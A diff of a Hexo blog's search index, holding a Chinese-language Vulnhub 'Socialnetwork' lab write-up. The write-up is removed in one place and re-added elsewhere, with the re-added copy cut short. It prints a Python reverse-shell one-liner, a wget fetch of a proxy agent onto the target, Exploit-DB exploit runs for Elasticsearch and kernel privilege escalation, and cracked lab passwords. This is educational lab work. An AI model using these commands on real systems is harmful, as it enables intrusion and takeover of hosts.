@@ -81,189 +81,6 @@
       </tags>
   </entry>
   <entry>
-    <title>1. Vulnhub Socialnetwork writeup</title>
-    <url>/2022/03/27/1.%20Vulnhub%20Socialnetwork%20writeup/</url>
-    <content><![CDATA[<p>该靶机难度中等。将内网渗透过程中的主要知识点都涉及了，质量非常高。</p>
-<span id="more"></span>
-<h1 id="靶机信息">靶机信息</h1>
-<p>靶机地址：https://www.vulnhub.com/entry/boredhackerblog-social-network,454/</p>
-<p>难度：Medium</p>
-<p>虚拟机软件：Virtual Box</p>
-<h1 id="虚拟机配置">虚拟机配置</h1>
-<h2 id="virtual-box-下载安装">Virtual Box 下载、安装</h2>
-<p>首先，去virtual box <a href="https://www.virtualbox.org/wiki/Downloads">官网</a>下载，要下载两个东西： 1. 安装包 2. 扩展包</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327143744.png" /></p>
-<p>记住，安装包和扩展包的版本得一致，否则扩展包无法安装。</p>
-<p>下载完毕之后，先安装Virtual Box，安装完毕之后选择 <code>管理-&gt;全局设定-&gt;扩展</code> 然后选择刚刚下载好的扩展包即可。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327143913.png" /></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327143956.png" /></p>
-<h2 id="网络配置">网络配置</h2>
-<ol type="1">
-<li>打开主机的 <code>网络适配器选项</code> 找到主机连接网络的网卡，然后共享到 <code>VirtualBox Host-Only Ethernet Adapter</code>。</li>
-</ol>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327144304.png" /></p>
-<p>设置共享的时候会跳出一个对话框，里面有IP地址，要记住它。</p>
-<ol start="2" type="1">
-<li>回到 virtual box，<code>管理-&gt;主机网络管理器</code></li>
-</ol>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327144440.png" /></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327144448.png" /></p>
-<p>第一张图中的IPv4地址修改成刚刚弹出的IP地址，其他也需要对应的修改为同一网段。</p>
-<ol start="3" type="1">
-<li>将kali和靶机都设置为如下</li>
-</ol>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327144559.png" /></p>
-<p>到这一步，打开kali会发现其实无法上网，那是因为此时没有路由，输入命令 <code>route -n</code> 结果如下：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327144727.png" /></p>
-<p>（我涂掉的那一行应该是没有的，我后天添加上去的）</p>
-<ol start="4" type="1">
-<li>添加路由</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo route add default gw 192.168.137.1 （刚刚记住的IP）</span><br></pre></td></tr></table></figure>
-<p>然后再次查看路由，结果如下：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327144914.png" /></p>
-<p>此时 <code>ping baidu.com</code> 发现有数据包，成功连接外网。（每次开机都需要添加一次路由，需要永久的可以百度）</p>
-<p>到此为止，配置结束。</p>
-<h1 id="渗透">渗透</h1>
-<p>打开kali和靶机，开始渗透。kali 的IP 为 <code>192.168.137.101</code>。</p>
-<h2 id="主机发现">主机发现</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">或者 sudo nmap 192.168.137.0/24</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327145228.png" /></p>
-<p>第一个是网关，第二个是主机在该网段的IP，所以第三个就是靶机的IP地址。</p>
-<p>靶机IP Get！</p>
-<h2 id="端口扫描">端口扫描</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p1-65535 192.168.137.102</span><br></pre></td></tr></table></figure>
-<p>在渗透的过程中最好全端口扫描，不要有遗漏！</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327145500.png" /></p>
-<p>开放端口为 22， 5000。</p>
-<p>端口信息 Get！</p>
-<h2 id="端口服务发现">端口服务发现</h2>
-<p>知道开放端口后，扫面一下对应端口的服务。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,5000 -sV 192.168.137.102</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327145655.png" /></p>
-<p>发现 5000 端口上的服务是 http，可能存在网页。版本信息为 <code>Werkzeug httpd 0.14.1</code> ， 用的是 python2，说明靶机存在着python环境。版本为 <code>2.7.15</code>。</p>
-<p>（百度一下 Werkzeug，Werkzeug 是一个WSGI工具包，也可以作为一个Web框架的底层库。）</p>
-<h2 id="访问http服务">访问http服务</h2>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327150053.png" /></p>
-<p>经过测试，只有这一个功能点，作用是将输入的内容显示出来。</p>
-<p><strong>web应用程序最重要的一步就是目录扫描！</strong></p>
-<h2 id="目录扫描">目录扫描</h2>
-<p>推荐使用 <code>dirsearch</code>，（如果没有的话可以按照提示安装）命令如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo dirsearch -u http://192.168.137.102:5000/</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327154504.png" /></p>
-<p>注意到有一个结果，访问看看</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327154534.png" /></p>
-<h2 id="反弹shell">反弹shell</h2>
-<p>根据这个页面的提示，这里好像可以执行代码，之前的信息里说明这个环境使用python搭建的，因此尝试以下python的代码执行，可以百度一下python反弹shell的代码（修改一下kali的IP和监听端口）：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;192.168.137.101&quot;</span>,<span class="number">8888</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br></pre></td></tr></table></figure>
-<p>然后在kali上监听对应的端口：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327155030.png" /></p>
-<p>（注意，要先监听，然后再执行 python 反弹 shell 的代码，大致上可以理解 kali 开启一个服务然后让靶机来链接，如果 kali 没开就连不上）</p>
-<p>成功反弹shell，运气很好，是 root。查看一下文件，发现有一个 <code>dockerfile</code> 文件。熟悉docker的应该感觉不对劲，<strong>可能这是一个docker容器，并不是真实的主机！</strong></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327155120.png" /></p>
-<p>查看 <code>Dockerfile</code> ，发现是docker模板文件：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327155427.png" /></p>
-<p>进一步怀疑当前是一个docker系统。接下来用两个方法进一步确定：</p>
-<ol type="1">
-<li><code>ls /.dockerenv</code>，根目录存在该文件，大概率为docker系统； <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327155548.png" /></li>
-<li><code>cat /proc/1/cgroup</code>，Linux初始化进程（进程id为1）的cgroup中包含着docker镜像信息的时候，可以确定是docker； <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327155620.png" /></li>
-</ol>
-<p>查看以下IP地址，发现IP地址和kali扫描出来的不一样</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327160430.png" /></p>
-<p>docker系统的这个网段可以当作是目标主机的内网网段，接下来就需要做到：</p>
-<ol type="1">
-<li>内网是否存在其他主机</li>
-<li>哪台主机是真实的目标</li>
-<li>是否存在漏洞可以利用</li>
-</ol>
-<h2 id="内网主机发现">内网主机发现</h2>
-<p>可以通过 <code>ping</code> 只要修改最后面的数值即可，但是这里子网有16位，也就是有65535个IP地址需要测试。 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for i in $(seq 1 255);do ping -c 1 172.17.0.$i; done</span><br><span class="line"></span><br><span class="line">for i in $(seq 0 255);do for j in $(seq 1 255);do ping -c 1 172.17.$i.$j;done;done</span><br><span class="line">解释：双层循环，-c后面的 1 表示一个地址只发一个数据包</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327185626.png" /></p>
-<p>发现内网内只有3个IP地址存活（这个脚本运行的比较慢，也可以用工具）。</p>
-<p>当前IP地址是 172.17.0.2，那么接下来就需要对另外两个主机进行扫描，因为kali的工具无法直接应用在内网环境下，所以需要利用代理，将172.17.0.2作为代理对内网主机进行扫描。</p>
-<h2 id="内网穿透">内网穿透</h2>
-<p>内网穿透工具：<a href="https://github.com/Dliv3/Venom">venom</a></p>
-<p>kali 另开一个cmd监听 9999 端口： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./admin_linux_x64 -lport 9999</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327191518.png" /></p>
-<p>kali 开启 http 服务： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 8295</span><br><span class="line"></span><br><span class="line">注意：要在venom所在目录运行，换句话说，要在agent.exe在的</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327191624.png" /></p>
-<p>靶机从kali下载代理端，并运行： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://192.168.137.101:8295/agent_linux_x64 根据靶机的操作系统选择对应的代理端</span><br><span class="line">如果提示没有文件，查看以下kali开启的http服务是否在venom目录下</span><br><span class="line"></span><br><span class="line">chmod +x agent_linux_x64</span><br><span class="line"></span><br><span class="line">./agent_linux_x64 -rhost 192.168.137.101 -rport 9999</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327192942.png" /></p>
-<p>启动 socks5 代理： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. show</span><br><span class="line">2. goto 1</span><br><span class="line">3. socks 1080 端口可以选其他的</span><br></pre></td></tr></table></figure> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327193102.png" /></p>
-<p>接下来修改配置文件 <code>proxychains4.conf</code>，这样就可以让工具通过代理进行工作了，命令前要加上 <code>proxychains</code>。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/proxychains4.conf</span><br><span class="line"></span><br><span class="line">将原来的 socks4 127.0.0.1 9050 注释</span><br><span class="line">添加：</span><br><span class="line">socks5 127.0.0.1 1080</span><br></pre></td></tr></table></figure></p>
-<h2 id="内网信息收集">内网信息收集</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. proxychains4 nmap -Pn -sT 172.17.0.1</span><br><span class="line">2. proxychains4 nmap -Pn -sT 172.17.0.3</span><br></pre></td></tr></table></figure>
-<p>结果分别为：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327194514.png" /></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327194527.png" /></p>
-<p>可以看到 172.17.0.1 的端口和服务与之前扫描 192.168.137.102 的时候一模一样，所以推测，这就是真正的主机。</p>
-<p>可以做一下验证，利用浏览器去访问 <code>172.17.0.1:5000</code> ，如果出现对应的页面，即可确定这就是真正的主机。</p>
-<p>不过浏览器也要设置代理，（其实也可以用 <code>proxychains4 firefox</code> 来打开浏览器，但是我这里不知道为什么实现不了）</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327195300.png" /></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327195311.png" /></p>
-<p>到此，可以完全确定 <code>172.17.0.1</code> 就是真正的主机！还有 <code>172.17.0.2</code> 也需要扫描（这里是因为我们之前拿到的是webshell，扫描看一下有没有漏洞能拿到shell权限）。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains nmap -Pn -sT 172.17.0.2</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327195702.png" /></p>
-<p>发现 9200 端口打开。查看一下对应的服务： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains nmap -Pn -sT -p9200 -sV 172.17.0.2</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327195826.png" /></p>
-<p><code>Elasticsearch</code> 版本为 1.4.2。可以用msf查看一下是否存在漏洞。</p>
-<h2 id="漏洞利用">漏洞利用</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit Elasticsearch</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327200545.png" /></p>
-<p>可以一个一个尝试，先尝试第一个。将exp复制到当前目录： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/remote/36337.py .</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327201304.png" /></p>
-<p>可以用 <code>cat 36337.py</code> 查看一下exp说明，发现是 python2 编写的。</p>
-<p>执行exp <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains4 python2 36337.py 172.17.0.2</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327201554.png" /></p>
-<p>又得到一个root权限，但是我们知道，这并不是真正的目标主机，因此进行信息收集。先查看目录，发现有一个 passwords 的文件。查看其中的内容：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327201855.png" /></p>
-<p>密码一般都是md5加密的，故尝试将所有密码用md5解密，推荐网址：<a href="https://www.somd5.com/">MD5解密</a>得到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john:1337hack</span><br><span class="line">test:1234test</span><br><span class="line">admin:1111pass</span><br><span class="line">root:1234pass</span><br><span class="line">jane:1234jane</span><br></pre></td></tr></table></figure></p>
-<p>想去目标主机开了 22 端口，服务为 ssh，因此尝试使用者这些账号和密码连接： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh [-p 22] john@192.168.100.102 不指定端口的话，默认就是22</span><br></pre></td></tr></table></figure></p>
-<p>经尝试，发现只有 john 能够成功登录。接下来就是提权了。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327202920.png" /></p>
-<h2 id="权限提升-本地提权">权限提升-本地提权</h2>
-<p>Linux提权一般优先考虑内核漏洞进行提权。从ssh连接可以看出靶机的系统为 Ubuntu 并且版本为 3.13.0，当且的版本因该是5.x。这里差了两个大更新，因此大概率存在着漏洞。用msf搜索。 <code>searchsploit linux kernel 3.13</code> 可以看到搜索出很多，真实场景的话需要一个一个尝试，这里就挑选一个 37292.c</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327203630.png" /></p>
-<p>复制exp到当前目录 <code>cp /usr/share/exploitdb/exploits/linux/local/37292.c .</code></p>
-<p>这是c编写的，需要用 gcc 编译，但是目标主机可能没有 gcc，所以需要在kali上编译完在传到靶机。因为它是C语言写的，所以查看一下内容是否还有编译的</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327203936.png" /></p>
-<p>注意到，代码中还调用system，然后利用 gcc 进行编译，因此要进行修改。把相关的代码删除，然后进行编译。（删掉部分从图中第二行开始到if语句结束）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc 37292.c -o a</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327205736.png" /></p>
-<p>将 <code>ofs-lib.so</code> 文件也复制到相同目录，一起传到目标主机。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">locate ofs-lib.so</span><br><span class="line"></span><br><span class="line">如果提示：var/lib/mlocate/mlocate.db: 没有那个文件或目录。说明数据库太久没更新了，利用 updtedb 更新一下在搜索即可、</span><br><span class="line"></span><br><span class="line">cp /usr/share/metasploit-framework/data/exploits/CVE-2015-1328/ofs-lib.so .</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327211113.png" /></p>
-<p>然后开启http服务，目标主机下载这两个文件</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327211453.png" /></p>
-<blockquote>
-<p>为了更好的利用exp，建议将这两个文件移到 <code>tmp</code> 目录，因为这个目录的权限一般比较多</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv * /tmp</span><br></pre></td></tr></table></figure>
-<p>执行exp拿到root权限。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. cd /tmp</span><br><span class="line">2. chmod +x a</span><br><span class="line">3. ./a</span><br><span class="line">4. id</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327211724.png" /></p>
-<p>到此为止，整个靶机的攻击过程都结束了。</p>
-<h1 id="总结">总结</h1>
-<p>完整的渗透过程主要有三个部分：</p>
-<ol type="1">
-<li>利用Web漏洞，拿到webshell，然后再拿到低权限shell；</li>
-<li>权限提升，收集内网信息，确认存活主机。信息收集的越多，发现的可利用漏洞越多，第三步越容易成功；</li>
-<li>依次拿到权限，最终拿到目标主机的root权限（比如域控）；</li>
-</ol>
-<p>该靶机给我的最大启示如下：</p>
-<ol type="1">
-<li>找到漏洞exp的时候不要着急的利用，先查看一下代码，代码中所利用的命令可能目标主机上并没有，所以需要在我们自己的主机上准备就绪后再传到目标主机。</li>
-<li><code>/tmp</code> 权限比较多</li>
-</ol>
-]]></content>
-      <categories>
-        <category>内网渗透</category>
-      </categories>
-      <tags>
-        <tag>综合</tag>
-        <tag>vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>10 Vulnhub HackSudoThor Writeup</title>
     <url>/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/</url>
     <content><![CDATA[<p>该靶机难度为中等，主要是<strong>破壳漏洞</strong>为第一次遇到，有点没底。</p>
@@ -576,163 +393,179 @@
       </tags>
   </entry>
   <entry>
-    <title>13 Vulnhub DoubleTrouble Writeup</title>
-    <url>/2022/04/18/13%20Vulnhub%20DoubleTrouble%20Writeup/</url>
-    <content><![CDATA[<p>该靶机难度为简单，漏洞其实都不难发现，主要的难点在于第一台靶机隐写图片的发现和破解以及第二台靶机的sql注入漏洞的发现。</p>
+    <title>1. Vulnhub Socialnetwork writeup</title>
+    <url>/2022/03/27/1.%20Vulnhub%20Socialnetwork%20writeup/</url>
+    <content><![CDATA[<p>该靶机难度中等。将内网渗透过程中的主要知识点都涉及了，质量非常高。</p>
 <span id="more"></span>
-<h1 id="靶机信息">1 靶机信息</h1>
-<p>靶机地址：</p>
-<ul>
-<li>https://www.vulnhub.com/entry/doubletrouble-1,743/</li>
-</ul>
-<p>难度：</p>
-<ul>
-<li>简单</li>
-</ul>
-<p>目标：</p>
-<ul>
-<li>取得两台靶机root权限</li>
-<li>拿到两个flag</li>
-</ul>
-<p>涉及攻击方法：</p>
-<ul>
-<li>主机发现</li>
-<li>端口扫描</li>
-<li>Web信息收集</li>
-<li>开源CMS漏洞利用</li>
-<li>文件上传</li>
-<li>隐写术</li>
-<li>密码爆破</li>
-<li>GTFObins提权</li>
-<li>SQL盲注</li>
-<li><strong>脏牛提权</strong></li>
-</ul>
-<h1 id="渗透第一台靶机">2 渗透——第一台靶机</h1>
-<p>攻击主机kali: 10.0.2.4</p>
-<h2 id="主机发现端口扫描端口服务发现">2.1 主机发现、端口扫描、端口服务发现</h2>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.17</span><br><span class="line">sudo nmap -p22,80 -A 10.0.2.17</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418091054.png" /></p>
-<p>得到如下信息：</p>
-<ul>
-<li>22端口的服务为ssh</li>
-<li>80端口的服务为http，版本为Apache2.4.38</li>
-<li>靶机操作系统为Debian</li>
-</ul>
-<h2 id="访问http服务">2.2 访问http服务</h2>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418091209.png" /></p>
-<p>得到一个登陆界面，经尝试，发现不知道邮箱无法登录，也不存在sql注入。但是下面的两行内容很奇怪，点击发现来到了<code>qdPM</code>官网，发现，这是一个开源的CMS，最新的版本是9.2，而靶机的是9.1，因而查看了一下更新日志，除了找到几个路径之外（路径扫描也能扫出来），没有其他收获。</p>
+<h1 id="靶机信息">靶机信息</h1>
+<p>靶机地址：https://www.vulnhub.com/entry/boredhackerblog-social-network,454/</p>
+<p>难度：Medium</p>
+<p>虚拟机软件：Virtual Box</p>
+<h1 id="虚拟机配置">虚拟机配置</h1>
+<h2 id="virtual-box-下载安装">Virtual Box 下载、安装</h2>
+<p>首先，去virtual box <a href="https://www.virtualbox.org/wiki/Downloads">官网</a>下载，要下载两个东西： 1. 安装包 2. 扩展包</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327143744.png" /></p>
+<p>记住，安装包和扩展包的版本得一致，否则扩展包无法安装。</p>
+<p>下载完毕之后，先安装Virtual Box，安装完毕之后选择 <code>管理-&gt;全局设定-&gt;扩展</code> 然后选择刚刚下载好的扩展包即可。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327143913.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327143956.png" /></p>
+<h2 id="网络配置">网络配置</h2>
+<ol type="1">
+<li>打开主机的 <code>网络适配器选项</code> 找到主机连接网络的网卡，然后共享到 <code>VirtualBox Host-Only Ethernet Adapter</code>。</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327144304.png" /></p>
+<p>设置共享的时候会跳出一个对话框，里面有IP地址，要记住它。</p>
+<ol start="2" type="1">
+<li>回到 virtual box，<code>管理-&gt;主机网络管理器</code></li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327144440.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327144448.png" /></p>
+<p>第一张图中的IPv4地址修改成刚刚弹出的IP地址，其他也需要对应的修改为同一网段。</p>
+<ol start="3" type="1">
+<li>将kali和靶机都设置为如下</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327144559.png" /></p>
+<p>到这一步，打开kali会发现其实无法上网，那是因为此时没有路由，输入命令 <code>route -n</code> 结果如下：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327144727.png" /></p>
+<p>（我涂掉的那一行应该是没有的，我后天添加上去的）</p>
+<ol start="4" type="1">
+<li>添加路由</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo route add default gw 192.168.137.1 （刚刚记住的IP）</span><br></pre></td></tr></table></figure>
+<p>然后再次查看路由，结果如下：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327144914.png" /></p>
+<p>此时 <code>ping baidu.com</code> 发现有数据包，成功连接外网。（每次开机都需要添加一次路由，需要永久的可以百度）</p>
+<p>到此为止，配置结束。</p>
+<h1 id="渗透">渗透</h1>
+<p>打开kali和靶机，开始渗透。kali 的IP 为 <code>192.168.137.101</code>。</p>
+<h2 id="主机发现">主机发现</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">或者 sudo nmap 192.168.137.0/24</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327145228.png" /></p>
+<p>第一个是网关，第二个是主机在该网段的IP，所以第三个就是靶机的IP地址。</p>
+<p>靶机IP Get！</p>
+<h2 id="端口扫描">端口扫描</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p1-65535 192.168.137.102</span><br></pre></td></tr></table></figure>
+<p>在渗透的过程中最好全端口扫描，不要有遗漏！</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327145500.png" /></p>
+<p>开放端口为 22， 5000。</p>
+<p>端口信息 Get！</p>
+<h2 id="端口服务发现">端口服务发现</h2>
+<p>知道开放端口后，扫面一下对应端口的服务。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,5000 -sV 192.168.137.102</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327145655.png" /></p>
+<p>发现 5000 端口上的服务是 http，可能存在网页。版本信息为 <code>Werkzeug httpd 0.14.1</code> ， 用的是 python2，说明靶机存在着python环境。版本为 <code>2.7.15</code>。</p>
+<p>（百度一下 Werkzeug，Werkzeug 是一个WSGI工具包，也可以作为一个Web框架的底层库。）</p>
+<h2 id="访问http服务">访问http服务</h2>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327150053.png" /></p>
+<p>经过测试，只有这一个功能点，作用是将输入的内容显示出来。</p>
+<p><strong>web应用程序最重要的一步就是目录扫描！</strong></p>
+<h2 id="目录扫描">目录扫描</h2>
+<p>推荐使用 <code>dirsearch</code>，（如果没有的话可以按照提示安装）命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo dirsearch -u http://192.168.137.102:5000/</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327154504.png" /></p>
+<p>注意到有一个结果，访问看看</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327154534.png" /></p>
+<h2 id="反弹shell">反弹shell</h2>
+<p>根据这个页面的提示，这里好像可以执行代码，之前的信息里说明这个环境使用python搭建的，因此尝试以下python的代码执行，可以百度一下python反弹shell的代码（修改一下kali的IP和监听端口）：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;192.168.137.101&quot;</span>,<span class="number">8888</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br></pre></td></tr></table></figure>
+<p>然后在kali上监听对应的端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327155030.png" /></p>
+<p>（注意，要先监听，然后再执行 python 反弹 shell 的代码，大致上可以理解 kali 开启一个服务然后让靶机来链接，如果 kali 没开就连不上）</p>
+<p>成功反弹shell，运气很好，是 root。查看一下文件，发现有一个 <code>dockerfile</code> 文件。熟悉docker的应该感觉不对劲，<strong>可能这是一个docker容器，并不是真实的主机！</strong></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327155120.png" /></p>
+<p>查看 <code>Dockerfile</code> ，发现是docker模板文件：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327155427.png" /></p>
+<p>进一步怀疑当前是一个docker系统。接下来用两个方法进一步确定：</p>
+<ol type="1">
+<li><code>ls /.dockerenv</code>，根目录存在该文件，大概率为docker系统； <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327155548.png" /></li>
+<li><code>cat /proc/1/cgroup</code>，Linux初始化进程（进程id为1）的cgroup中包含着docker镜像信息的时候，可以确定是docker； <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327155620.png" /></li>
+</ol>
+<p>查看以下IP地址，发现IP地址和kali扫描出来的不一样</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327160430.png" /></p>
+<p>docker系统的这个网段可以当作是目标主机的内网网段，接下来就需要做到：</p>
+<ol type="1">
+<li>内网是否存在其他主机</li>
+<li>哪台主机是真实的目标</li>
+<li>是否存在漏洞可以利用</li>
+</ol>
+<h2 id="内网主机发现">内网主机发现</h2>
